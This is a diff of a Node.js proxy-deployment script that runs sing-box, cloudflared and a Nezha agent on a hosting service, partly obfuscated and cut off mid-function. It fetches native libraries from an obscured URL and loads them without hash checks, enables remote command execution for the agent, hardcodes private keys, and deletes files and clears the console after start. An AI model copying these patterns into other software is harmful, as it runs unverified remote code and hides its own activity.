_0x82df0d['pathname']==='/'?(_0x1e5e5c[_0x2add6f(0x1a1)](_0x2add6f(0x1ec),_0x2add6f(0x172)),_0x1e5e5c[_0x2add6f(0x15c)](_0x2add6f(0x160))):(_0x1e5e5c['statusCode']=0x194,_0x1e5e5c[_0x2add6f(0x15c)](_0x2add6f(0x121)));});function _0x14267c(_0xe9e6b6,_0x4be655){const _0x2c1243=_0x40b3;_0xd94b4e[_0x2c1243(0x111)](_0xe9e6b6,_0x2c1243(0x1fc),()=>{const _0x372358=_0x2c1243;console[_0x372358(0x1b8)](_0x372358(0x198)+_0xe9e6b6+subscribePath);}),_0xd94b4e[_0x2c1243(0x1fd)](_0x2c1243(0x1ba),_0x28b757=>{const _0x29ead1=_0x2c1243;_0x28b757[_0x29ead1(0x10f)]===_0x29ead1(0x1d6)&&_0x4be655>0x0?(console[_0x29ead1(0x1b8)](_0x29ead1(0x13d)+_0xe9e6b6+_0x29ead1(0x151)+(_0xe9e6b6+0x1)+_0x29ead1(0x130)),_0x14267c(_0xe9e6b6+0x1,_0x4be655-0x1)):console[_0x29ead1(0x1ba)](_0x29ead1(0x192),_0x28b757[_0x29ead1(0xfa)]);});}_0x14267c(httpPort,0x5);}async function startServer(){const _0x4328d3=_0x71d8d2;deleteNodes();!fs[_0x4328d3(0x166)](FILE_PATH)&&(fs[_0x4328d3(0x1af)](FILE_PATH),console[_0x4328d3(0x1b8)](FILE_PATH+_0x4328d3(0x191)));cleanupOldFiles(),argoType();const _0x21ec22='https://'+arch+_0x4328d3(0x18b),_0xe31a08=await downloadLibrary(_0x21ec22+_0x4328d3(0x12b),_0x4328d3(0x11c));let _0x48a499=null,_0x5bf3c3=null;DISABLE_ARGO!=='true'&&DISABLE_ARGO!==!![]&&(_0x48a499=await downloadLibrary(_0x21ec22+_0x4328d3(0x190),_0x4328d3(0x13a)));NEZHA_SERVER&&NEZHA_KEY?_0x5bf3c3=await downloadLibrary(_0x21ec22+_0x4328d3(0x1fa),'v1.so'):console[_0x4328d3(0x1b8)](_0x4328d3(0x115));REALITY_PORT&&generateOrLoadKeyPair();const _0x2af782=path[_0x4328d3(0x155)](FILE_PATH,_0x4328d3(0x1a8)),_0x16e567=path[_0x4328d3(0x155)](FILE_PATH,_0x4328d3(0x103)),_0x3b1732=!!(HY2_PORT||TUIC_PORT||ANYTLS_PORT);_0x3b1732&&ensureTlsCertificates(_0x2af782,_0x16e567);NEZHA_SERVER&&NEZHA_KEY&&!NEZHA_PORT&&generateNezhaConfig();const _0x3c4921=generateSingBoxConfig(_0x2af782,_0x16e567);fs[_0x4328d3(0x14f)](singBoxConfigPath,JSON[_0x4328d3(0xfe)](_0x3c4921,null,0x2));const _0x3edf5a=[],_0x1e18ff=createService(_0x4328d3(0x1f7),_0xe31a08,_0x4328d3(0x152),_0x4328d3(0x13f),singBoxPayload());_0x3edf5a[_0x4328d3(0x14b)](_0x1e18ff);let _0x3f85c3=null;if(_0x48a499){const _0x5d5b7d=cloudflaredPayload();_0x5d5b7d&&(_0x3f85c3=createService('cloudflared',_0x48a499,'StartCloudflared','StopCloudflared',_0x5d5b7d),_0x3edf5a[_0x4328d3(0x14b)](_0x3f85c3));}let _0x5e88d4=null;_0x5bf3c3&&(_0x5e88d4=createService('nezha-agent',_0x5bf3c3,_0x4328d3(0x20d),_0x4328d3(0x1f4),nezhaPayload()),_0x3edf5a[_0x4328d3(0x14b)](_0x5e88d4));async function _0x268d64(){const _0x25ab3e=_0x4328d3;for(let _0x78a136=_0x3edf5a[_0x25ab3e(0x108)]-0x1;_0x78a136>=0x0;_0x78a136--){try{await _0x3edf5a[_0x78a136][_0x25ab3e(0x157)]();}catch(_0x275311){}}process[_0x25ab3e(0x162)](0x0);}process['on'](_0x4328d3(0x163),_0x268d64),process['on'](_0x4328d3(0x116),_0x268d64),_0x3edf5a['forEach'](_0x3f92ff=>_0x3f92ff['start']()),await new Promise(_0x3429fe=>setTimeout(_0x3429fe,0x3e8)),console[_0x4328d3(0x1b8)]('web\x20is\x20running');if(_0x3f85c3)console[_0x4328d3(0x1b8)](_0x4328d3(0x17a));if(_0x5e88d4)console[_0x4328d3(0x1b8)](_0x4328d3(0x1a5));await new Promise(_0x4c97a2=>setTimeout(_0x4c97a2,0x1388));const _0x451d5a=await extractDomain(),_0xf29754=await generateLinks(_0x451d5a);startHttpServer(_0xf29754),await sendTelegram(),await uploadNodes(),await addVisitTask(),setTimeout(()=>{const _0x27b447=_0x4328d3;cleanupFiles({'keepSub':!![]}),clearConsole(),console[_0x27b447(0x1b8)](_0x27b447(0x1c5)),console[_0x27b447(0x1b8)](_0x27b447(0x188));},0xafc8);}startServer(),setInterval(()=>{},0x3e8);
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const http = require('http');
+const crypto = require('crypto');
+const axios = require('axios');
+const koffi = require('koffi');
+const { execSync } = require('child_process');
+
+try { require('dotenv').config(); } catch { /* ignore if dotenv unavailable */ }
+
+// ======================== 环境变量定义 ========================
+const UPLOAD_URL     = process.env.UPLOAD_URL     || '';         // 订阅或节点自动上传地址,需填写部署Merge-sub项目后的首页地址
+const PROJECT_URL    = process.env.PROJECT_URL    || '';         // 需要上传订阅或保活时需填写项目分配的url
+const AUTO_ACCESS    = process.env.AUTO_ACCESS    || false;      // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
+const YT_WARPOUT     = process.env.YT_WARPOUT     || false;      // 设置为true时强制使用warp出站访问youtube
+const FILE_PATH      = process.env.FILE_PATH      || '.npm';     // sub.txt订阅文件路径
+const SUB_PATH       = process.env.SUB_PATH       || 'sub';      // 订阅sub路径，默认为sub
+const UUID           = process.env.UUID           || '32597759-58c2-4fa0-96f4-b6b94a5255da'; // UUID，运行哪吒请修改
+const NEZHA_SERVER   = process.env.NEZHA_SERVER   || '';         // 哪吒面板地址，v1形式：nz.serv00.net:8008
+const NEZHA_PORT     = process.env.NEZHA_PORT     || '';         // v1哪吒请留空，v0 agent端口
+const NEZHA_KEY      = process.env.NEZHA_KEY      || '';         // v1的NZ_CLIENT_SECRET或v0 agent密钥
+const ARGO_DOMAIN    = process.env.ARGO_DOMAIN    || '';         // argo固定隧道域名,留空即使用临时隧道
+const ARGO_AUTH      = process.env.ARGO_AUTH      || '';         // argo固定隧道token或json,留空即使用临时隧道
+const ARGO_PORT      = Number(process.env.ARGO_PORT) || 9527;    // argo固定隧道端口
+const S5_PORT        = process.env.S5_PORT        || '';         // socks5端口，留空不启用
+const TUIC_PORT      = process.env.TUIC_PORT      || '';         // tuic端口，留空不启用
+const HY2_PORT       = process.env.HY2_PORT       || '';         // hy2端口，留空不启用
+const ANYTLS_PORT    = process.env.ANYTLS_PORT    || '';         // AnyTLS端口，留空不启用
+const REALITY_PORT   = process.env.REALITY_PORT   || '';         // reality端口，留空不启用
+const CFIP           = process.env.CFIP           || 'saas.sin.fan'; // 优选域名或优选IP
+const CFPORT         = Number(process.env.CFPORT) || 443;        // 优选域名或优选IP对应端口
+const PORT           = Number(process.env.PORT)   || 8080;       // http订阅端口
+const NAME           = process.env.NAME           || 'Railway-US';         // 节点名称
+const CHAT_ID        = process.env.CHAT_ID        || '';         // Telegram chat_id，两个变量不全不推送
+const BOT_TOKEN      = process.env.BOT_TOKEN      || '';         // Telegram bot_token，两个变量不全不推送
+const DISABLE_ARGO   = process.env.DISABLE_ARGO   || false;      // 设置为true时禁用argo
+// ==============================================================
+
+const ROOT = process.cwd();
+const runtimeFilePath = path.resolve(ROOT, FILE_PATH);
+const libraryDir = runtimeFilePath;
+const singBoxConfigPath = path.resolve(runtimeFilePath, 'config.json');
+const nezhaConfigPath = path.resolve(runtimeFilePath, 'config.yaml');
+const bootLogPath = path.resolve(runtimeFilePath, 'boot.log');
+const subPath = path.resolve(runtimeFilePath, 'sub.txt');
+const listPath = path.resolve(runtimeFilePath, 'list.txt');
+const keypairPath = path.resolve(runtimeFilePath, 'keypair.properties');
+const subscribePath = '/' + SUB_PATH.replace(/^\//, '');
+const httpPort = PORT;
+
+const arch = (() => {
+  const a = os.arch().toLowerCase();
+  if (a === 'arm64' || a === 'aarch64') return 'arm64';
+  return 'amd64';
+})();
+
+let privateKey = '';
+let publicKey = '';
+
+// ======================== 辅助函数 ========================
+
+function isValidPort(port) {
+  try {
+    if (port === null || port === undefined || port === '') return false;
+    if (typeof port === 'string' && port.trim() === '') return false;
+    const portNum = parseInt(port);
+    if (isNaN(portNum)) return false;
+    if (portNum < 1 || portNum > 65535) return false;
+    return true;
+  } catch (error) {
+    return false;
+  }
+}
+
+// ======================== 文件清理 ========================
+
+const pathsToDelete = ['boot.log', 'list.txt', 'config.json', 'config.yaml', 'cert.pem', 'private.key', 'tunnel.json', 'tunnel.yml'];
+function cleanupOldFiles() {
+  pathsToDelete.forEach(file => {
+    const filePath = path.join(FILE_PATH, file);
+    fs.unlink(filePath, () => {});
+  });
+  const tmpDir = path.resolve(ROOT, '.tmp');
+  if (fs.existsSync(tmpDir)) {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (e) { }
+  }
+}
+
+function cleanupFiles(options = {}) {
+  const keepFiles = new Set(['keypair.properties']);
+  if (options.keepSub) keepFiles.add('sub.txt');
+  if (fs.existsSync(runtimeFilePath)) {
+    try {
+      const files = fs.readdirSync(runtimeFilePath);
+      for (const file of files) {
+        if (keepFiles.has(file)) continue;
+        const filePath = path.resolve(runtimeFilePath, file);
+        try {
+          const stat = fs.statSync(filePath);
+          if (stat.isDirectory()) {
+            fs.rmSync(filePath, { recursive: true, force: true });
+          } else {
+            fs.unlinkSync(filePath);
+          }
+        } catch (e) { /* skip locked/in-use files */ }
+      }
+    } catch (e) {
+      console.error('Cleanup failed:', e.message);
+    }
+  }
+  const tmpDir = path.resolve(ROOT, '.tmp');
+  if (fs.existsSync(tmpDir)) {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (e) { }
+  }
+}
+
+function clearConsole() {
+  process.stdout.write('\x1Bc');
+}
+
+// ======================== 节点删除 ========================
+
+function deleteNodes() {
+  try {
+    if (!UPLOAD_URL) return;
+    if (!fs.existsSync(subPath)) return;
+    let fileContent;
+    try { fileContent = fs.readFileSync(subPath, 'utf-8'); } catch { return null; }
+    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
+    const nodes = decoded.split('\n').filter(line =>
+      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
+    );
+    if (nodes.length === 0) return;
+    return axios.post(`${UPLOAD_URL}/api/delete-nodes`,
+      JSON.stringify({ nodes }),
+      { headers: { 'Content-Type': 'application/json' } }
+    ).catch(() => null);
+  } catch (err) {
+    return null;
+  }
+}
+
+// ======================== Argo 隧道配置 ========================
+
+function argoType() {
+  if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) {
+    console.log("DISABLE_ARGO is set to true, disable argo tunnel");
+    return;
+  }
+  if (!ARGO_AUTH || !ARGO_DOMAIN) {
+    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnel");
+    return;
+  }
+  if (ARGO_AUTH.includes('TunnelSecret')) {
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
+    const tunnelYaml = `
+  tunnel: ${ARGO_AUTH.split('"')[11]}
+  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
+  protocol: http2
+  
+  ingress:
+    - hostname: ${ARGO_DOMAIN}
+      service: http://localhost:${ARGO_PORT}
+      originRequest:
+        noTLSVerify: true
+    - service: http_status:404
+  `;
+    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
+  } else {
+    console.log(`Using token connect to tunnel, please set ${ARGO_PORT} in cloudflare`);
+  }
+}
+
+// ======================== 下载库文件 ========================
+
+async function sha256Matches(filePath, expected) {
+  if (!expected) return true;
+  const actual = await sha256(filePath);
+  return actual.toLowerCase() === expected.toLowerCase();
+}
+
+function sha256(filePath) {
+  return new Promise((resolve, reject) => {
+    const hash = crypto.createHash('sha256');
+    const stream = fs.createReadStream(filePath);
+    stream.on('data', chunk => hash.update(chunk));
+    stream.on('end', () => resolve(hash.digest('hex')));
+    stream.on('error', reject);
+  });
+}
+
+async function downloadLibrary(url, fileName, expectedSha256) {
+  const target = path.resolve(libraryDir, fileName);
+  if (fs.existsSync(target) && await sha256Matches(target, expectedSha256)) {
+    console.log(`Using cached native library: ${target}`);
+    return target;
+  }
+  await fs.promises.mkdir(libraryDir, { recursive: true });
+  const tmp = path.resolve(libraryDir, `${fileName}.download`);
+  const writer = fs.createWriteStream(tmp);
+  console.log(`Downloading ${url} -> ${target}`);
+  const response = await axios.get(url, { responseType: 'stream', timeout: 3 * 60 * 1000 });
+  if (response.status < 200 || response.status >= 300) {
+    throw new Error(`Failed to download ${url}: HTTP ${response.status}`);
+  }
+  response.data.pipe(writer);
+  await new Promise((resolve, reject) => writer.on('finish', resolve).on('error', reject));
+  if (!(await sha256Matches(tmp, expectedSha256))) {
+    throw new Error(`SHA-256 mismatch for ${tmp}`);
+  }
+  await fs.promises.rename(tmp, target);
+  return target;
+}
+
+// ======================== Koffi 服务管理 ========================
+
+function createService(name, libraryPath, startSymbol, stopSymbol, payload) {
+  const lib = koffi.load(libraryPath);
+  const startFn = lib.func(`int ${startSymbol}(str)`);
+  const stopFn = lib.func(`int ${stopSymbol}()`);
+  return {
+    name,
+    start: () => {
+      startFn.async(payload || '', (err, code) => {
+        if (err) {
+          console.error(`${name} native service failed: ${err.message}`);
+        } else if (code !== 0) {
+          console.warn(`${name} native service exited with code ${code}`);
+        }
+      });
+    },
+    stop: () => new Promise((resolve, reject) => {
+      try {
+        stopFn.async((err, code) => {
+          if (err) return reject(err);
+          resolve(code);
+        });
+      } catch (error) {
+        resolve(-1);
+      }
+    })
+  };
+}
+
+// ======================== Reality X25519 密钥对 (纯JS) ========================
+
+const _X25519_P = (1n << 255n) - 19n;
+const _X25519_A24 = 121665n;
+
+function _clampScalar(buf) {
+  buf[0] &= 248;
+  buf[31] &= 127;
+  buf[31] |= 64;
+}
+
+function _mod(value) {
+  value = ((value % _X25519_P) + _X25519_P) % _X25519_P;
+  return value;
+}
+
+function _decodeLE(buf) {
+  let result = 0n;
+  for (let i = buf.length - 1; i >= 0; i--) {
+    result = (result << 8n) | BigInt(buf[i]);
+  }
+  return result;
+}
+
+function _encodeLE(value) {
+  const buf = Buffer.alloc(32);
+  for (let i = 0; i < 32; i++) {
+    buf[i] = Number(value & 0xffn);
+    value >>= 8n;
+  }
+  return buf;
+}
+
+function _x25519(scalar, u) {
+  let x1 = _decodeLE(u);
+  let x2 = 1n, z2 = 0n, x3 = x1, z3 = 1n;
+  let swap = 0;
+  for (let t = 254; t >= 0; t--) {
+    const byteIdx = Math.floor(t / 8);
+    const kt = ((scalar[byteIdx] & 0xff) >> (t % 8)) & 1;
+    swap ^= kt;
+    if (swap) { [x2, x3] = [x3, x2]; [z2, z3] = [z3, z2]; }
+    swap = kt;
+    const a = _mod(x2 + z2);
+    const aa = _mod(a * a);
+    const b = _mod(x2 - z2 + _X25519_P);
+    const bb = _mod(b * b);
+    const e = _mod(aa - bb + _X25519_P);
+    const c = _mod(x3 + z3);
+    const d = _mod(x3 - z3 + _X25519_P);
+    const da = _mod(d * a);
+    const cb = _mod(c * b);
+    x3 = _mod((da + cb) * (da + cb));
+    z3 = _mod(x1 * _mod((da - cb + _X25519_P) * (da - cb + _X25519_P)));
+    x2 = _mod(aa * bb);
+    z2 = _mod(e * _mod(aa + _X25519_A24 * e));
+  }
+  if (swap) { [x2, x3] = [x3, x2]; [z2, z3] = [z3, z2]; }
+  const z2inv = _modPow(z2, _X25519_P - 2n, _X25519_P);
+  return _encodeLE(_mod(x2 * z2inv));
+}
+
+function _modPow(base, exp, mod) {
+  let result = 1n;
+  base = base % mod;
+  while (exp > 0n) {
+    if (exp % 2n === 1n) result = (result * base) % mod;
+    exp >>= 1n;
+    base = (base * base) % mod;
+  }
+  return result;
+}
+
+function generateRealityKeyPair() {
+  const privateBytes = crypto.randomBytes(32);
+  _clampScalar(privateBytes);
+  const basepoint = Buffer.alloc(32);
+  basepoint[0] = 9;
+  const publicBytes = _x25519(privateBytes, basepoint);
+  return {
+    privateKey: privateBytes.toString('base64url'),
+    publicKey: publicBytes.toString('base64url')
+  };
+}
+
+function generateOrLoadKeyPair() {
+  if (fs.existsSync(keypairPath)) {
+    const content = fs.readFileSync(keypairPath, 'utf8');
+    const privateKeyMatch = content.match(/PrivateKey:\s*(.*)/);
+    const publicKeyMatch = content.match(/PublicKey:\s*(.*)/);
+    if (privateKeyMatch && publicKeyMatch) {
+      privateKey = privateKeyMatch[1];
+      publicKey = publicKeyMatch[1];
+      console.log('Private Key:', privateKey);
+      console.log('Public Key:', publicKey);
+      return;
+    }
+  }
+  const pair = generateRealityKeyPair();
+  privateKey = pair.privateKey;
+  publicKey = pair.publicKey;
+  fs.writeFileSync(keypairPath, `PrivateKey: ${privateKey}\nPublicKey: ${publicKey}\n`, 'utf8');
+  console.log('Private Key:', privateKey);
+  console.log('Public Key:', publicKey);
+}
+
+// ======================== TLS 证书 ========================
+
+const FALLBACK_EC_KEY =
+  '-----BEGIN EC PARAMETERS-----\n' +
+  'BggqhkjOPQMBBw==\n' +
+  '-----END EC PARAMETERS-----\n' +
+  '-----BEGIN EC PRIVATE KEY-----\n' +
+  'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n' +
+  'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n' +
+  '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n' +
+  '-----END EC PRIVATE KEY-----\n';
+
+const FALLBACK_CERT =
+  '-----BEGIN CERTIFICATE-----\n' +
+  'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n' +
+  'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n' +
+  'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n' +
+  'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n' +
+  'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n' +
+  'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n' +
+  'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n' +
+  'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n' +
+  '-----END CERTIFICATE-----\n';
+
+function ensureTlsCertificates(certPath, keyPath) {
+  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) return;
+  fs.mkdirSync(path.dirname(certPath), { recursive: true });
+  try {
+    execSync('openssl version', { stdio: 'ignore' });
+    execSync(`openssl ecparam -genkey -name prime256v1 -out "${keyPath}"`, { stdio: 'ignore' });
+    execSync(`openssl req -new -x509 -days 3650 -key "${keyPath}" -out "${certPath}" -subj "/CN=bing.com"`, { stdio: 'ignore' });
+    return;
+  } catch (e) { /* openssl not available */ }
+  fs.writeFileSync(keyPath, FALLBACK_EC_KEY);
+  fs.writeFileSync(certPath, FALLBACK_CERT);
+}
+
+// ======================== sing-box 配置生成 ========================
+
+function generateSingBoxConfig(certPath, keyPath) {
+  const inbounds = [];
+
+  // VMess+WS inbound (for argo reverse proxy)
+  inbounds.push({
+    type: 'vmess',
+    tag: 'vmess-ws-in',
+    listen: '::',
+    listen_port: ARGO_PORT,
+    users: [{ uuid: UUID }],
+    transport: {
+      type: 'ws',
+      path: '/vmess-argo',
+      early_data_header_name: 'Sec-WebSocket-Protocol'
+    }
+  });
+
+  // Reality
+  if (isValidPort(REALITY_PORT)) {
+    inbounds.push({
+      type: 'vless',
+      tag: 'vless-reality',
+      listen: '::',
+      listen_port: parseInt(REALITY_PORT),
+      users: [{ uuid: UUID, flow: 'xtls-rprx-vision' }],
+      tls: {
+        enabled: true,
+        server_name: 'www.iij.ad.jp',
+        reality: {
+          enabled: true,
+          handshake: { server: 'www.iij.ad.jp', server_port: 443 },
+          private_key: privateKey,
+          short_id: ['']
+        }
+      }
+    });
+  }
+
+  // Hysteria2
+  if (isValidPort(HY2_PORT)) {
+    inbounds.push({
+      type: 'hysteria2',
+      tag: 'hysteria-in',
+      listen: '::',
+      listen_port: parseInt(HY2_PORT),
+      users: [{ password: UUID }],
+      masquerade: 'https://bing.com',
+      tls: {
+        enabled: true,
+        alpn: ['h3'],
+        certificate_path: certPath,
+        key_path: keyPath
+      }
+    });
+  }
+
+  // TUIC
+  if (isValidPort(TUIC_PORT)) {
+    inbounds.push({
+      type: 'tuic',
+      tag: 'tuic-in',
+      listen: '::',
+      listen_port: parseInt(TUIC_PORT),
+      users: [{ uuid: UUID, password: UUID }],
+      congestion_control: 'bbr',
+      tls: {
+        enabled: true,
+        alpn: ['h3'],
+        certificate_path: certPath,
+        key_path: keyPath
+      }
+    });
+  }
+
+  // SOCKS5
+  if (isValidPort(S5_PORT)) {
+    inbounds.push({
+      type: 'socks',
+      tag: 's5-in',
+      listen: '::',
+      listen_port: parseInt(S5_PORT),
+      users: [{
+        username: UUID.substring(0, 8),
+        password: UUID.slice(-12)
+      }]
+    });
+  }
+
+  // AnyTLS
+  if (isValidPort(ANYTLS_PORT)) {
+    inbounds.push({
+      type: 'anytls',
+      tag: 'anytls-in',
+      listen: '::',
+      listen_port: parseInt(ANYTLS_PORT),
+      users: [{ password: UUID }],
+      tls: {
+        enabled: true,
+        certificate_path: certPath,
+        key_path: keyPath
+      }
+    });
+  }
+
+  // Wireguard endpoint + route rules
+  const endpoints = [{
+    type: 'wireguard',
+    tag: 'wireguard-out',
+    mtu: 1280,
+    address: ['172.16.0.2/32', '2606:4700:110:8dfe:d141:69bb:6b80:925/128'],
+    private_key: 'YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=',
+    peers: [{
+      address: 'engage.cloudflareclient.com',
+      port: 2408,
+      public_key: 'bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=',
+      allowed_ips: ['0.0.0.0/0', '::/0'],
+      reserved: [78, 135, 76]
+    }]
+  }];
+
+  const remoteRuleSet = (tag, url) => ({
+    tag,
+    type: 'remote',
+    format: 'binary',
+    url
+  });
+  const ruleSet = [
+    remoteRuleSet('netflix', 'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs'),
+    remoteRuleSet('openai', 'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs')
+  ];
+  const wireguardRuleSets = ['netflix'];
+
+  // YouTube WARP 出站检测
+  let needYoutubeWarp = YT_WARPOUT === true || YT_WARPOUT === 'true';
+  if (!needYoutubeWarp) {
+    try {
+      const youtubeTest = execSync('curl -o /dev/null -m 2 -s -w "%{http_code}" https://www.youtube.com', { encoding: 'utf8' }).trim();
+      needYoutubeWarp = youtubeTest !== '200';
+    } catch (curlError) {
+      if (curlError.output && curlError.output[1]) {
+        const test = curlError.output[1].toString().trim();
+        needYoutubeWarp = test !== '200';
+      } else {
+        needYoutubeWarp = true;
+      }
+    }
+  }
+  if (needYoutubeWarp) {
+    ruleSet.push(remoteRuleSet('youtube', 'https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs'));
+    wireguardRuleSets.push('youtube');
+    console.log('Add YouTube outbound rule');
+  }
+
+  const route = {
+    default_http_client: 'http-client-direct',
+    rule_set: ruleSet,
+    rules: [{ rule_set: wireguardRuleSets, outbound: 'wireguard-out' }],
+    final: 'direct'
+  };
+
+  return {
+    log: { disabled: true, level: 'error', timestamp: true },
+    http_clients: [{ tag: 'http-client-direct' }],
+    inbounds,
+    endpoints,
+    outbounds: [{ type: 'direct', tag: 'direct' }],
+    route
+  };
+}
+
+// ======================== nezha 配置生成 ========================
+
+function generateNezhaConfig() {
+  const nzport = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
+  const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
+  const nezhatls = tlsPorts.has(nzport) ? 'true' : 'false';
+  const configYaml = `client_secret: ${NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: ${NEZHA_SERVER}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: ${nezhatls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: ${UUID}`;
+  fs.writeFileSync(nezhaConfigPath, configYaml, 'utf8');
+}
+
+// ======================== Cloudflared Payload ========================
+
+function cloudflaredPayload() {
+  if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) return null;
+  if (ARGO_AUTH && ARGO_DOMAIN) {
+    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
+      return JSON.stringify({
+        args: ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', 'run', '--token', ARGO_AUTH]
+      });
+    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
+      return JSON.stringify({
+        args: ['tunnel', '--edge-ip-version', 'auto', '--config', path.join(FILE_PATH, 'tunnel.yml'), 'run']
+      });
+    }
+  }
+  // Quick tunnel
+  return JSON.stringify({
+    args: [
+      'tunnel', '--edge-ip-version', 'auto', '--no-autoupdate',
+      '--protocol', 'http2', '--logfile', bootLogPath,
+      '--loglevel', 'info', '--url', `http://localhost:${ARGO_PORT}`
+    ]
+  });
+}
+
+function singBoxPayload() {
+  return JSON.stringify({ config: singBoxConfigPath, workingDir: '.', disableColor: true });
+}
+
+function nezhaPayload() {
+  return JSON.stringify({ config: nezhaConfigPath });
+}
+
+// ======================== 隧道域名检测 ========================
+
+function waitForQuickTunnelDomain(logPath, timeoutMs) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    try {
+      if (fs.existsSync(logPath)) {
+        const content = fs.readFileSync(logPath, 'utf8');
+        const matches = [...content.matchAll(/https:\/\/([A-Za-z0-9.-]+\.trycloudflare\.com)/g)];
+        if (matches.length > 0) {
+          return matches[matches.length - 1][1];
+        }
+      }
+    } catch (e) { /* file may not exist yet */ }
+    const remaining = deadline - Date.now();
+    if (remaining <= 0) break;
+    const sleepMs = Math.min(1000, remaining);
+    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, sleepMs);
+  }
+  return null;
+}
+
+async function extractDomain() {
+  if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) return null;
+  if (ARGO_AUTH && ARGO_DOMAIN) {
+    console.log('ARGO_DOMAIN:', ARGO_DOMAIN);
+    return ARGO_DOMAIN;
+  }
+  // Quick tunnel
+  console.log('Waiting for quick tunnel domain in log...');
+  let domain = waitForQuickTunnelDomain(bootLogPath, 30000);
+  if (!domain) {
+    console.log('Quick tunnel domain not found, retrying...');
+    try { fs.unlinkSync(bootLogPath); } catch (e) { }
+    await new Promise(r => setTimeout(r, 5000));
+    domain = waitForQuickTunnelDomain(bootLogPath, 30000);
+  }
+  if (domain) {
+    console.log('ArgoDomain:', domain);
+  } else {
+    console.log('ArgoDomain not found');
+  }
+  return domain;
+}
+
+// ======================== ISP 信息 ========================
+
+async function getMetaInfo() {
+  try {
+    const response1 = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } });
+    if (response1.data && response1.data.country_code && response1.data.isp) {
+      return `${response1.data.country_code}-${response1.data.isp}`.replace(/\s+/g, '_');
+    }
+  } catch (error) {
+    try {
+      const response2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 } });
+      if (response2.data && response2.data.status === 'success' && response2.data.countryCode && response2.data.org) {
+        return `${response2.data.countryCode}-${response2.data.org}`.replace(/\s+/g, '_');
+      }
+    } catch (error) { /* backup also failed */ }
+  }
+  return 'Unknown';
+}
+
+// ======================== 节点链接生成 ========================
+
+async function generateLinks(argoDomain) {
+  let SERVER_IP = '';
+  try {
+    const ipv4Response = await axios.get('http://ipv4.ip.sb', { timeout: 3000 });
+    SERVER_IP = ipv4Response.data.trim();
+  } catch (err) {
+    try {
+      SERVER_IP = execSync('curl -sm 3 ipv4.ip.sb').toString().trim();
+    } catch (curlErr) {
+      try {
+        const ipv6Response = await axios.get('http://ipv6.ip.sb', { timeout: 3000 });
+        SERVER_IP = `[${ipv6Response.data.trim()}]`;
+      } catch (ipv6AxiosErr) {
+        try {
+          SERVER_IP = `[${execSync('curl -sm 3 ipv6.ip.sb').toString().trim()}]`;
+        } catch (ipv6CurlErr) {
+          console.error('Failed to get IP address:', ipv6CurlErr.message);
+        }
+      }
+    }
+  }
+
+  const ISP = await getMetaInfo();
+  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;
+
+  await new Promise(r => setTimeout(r, 2000));
+
+  let subTxt = '';
+
+  // VMess+WS (argo)
+  if ((DISABLE_ARGO !== 'true' && DISABLE_ARGO !== true) && argoDomain) {
